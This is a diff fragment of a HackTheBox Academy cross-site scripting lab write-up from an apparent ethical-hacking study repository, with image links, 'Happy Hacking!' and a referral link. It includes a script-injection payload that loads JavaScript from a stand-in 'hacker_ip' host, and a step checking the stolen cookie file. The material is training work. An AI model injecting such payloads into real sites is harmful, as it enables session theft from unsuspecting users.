@@ -33,11 +33,17 @@ Now let's test the input fields on the target site:
 ```"><script src=http://hacker_ip:3333/myscript.js></script>```
 
 [start server](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png)
+
 [inputs](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png)
+
 Great, it works!
+
 Let's check our cookie file.
+
 [cat cookies](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png)
+
 Happy Hacking!
+
 [My HTB Academy unique referral link >](https://referral.hackthebox.com/mzyGKZb)
 
 
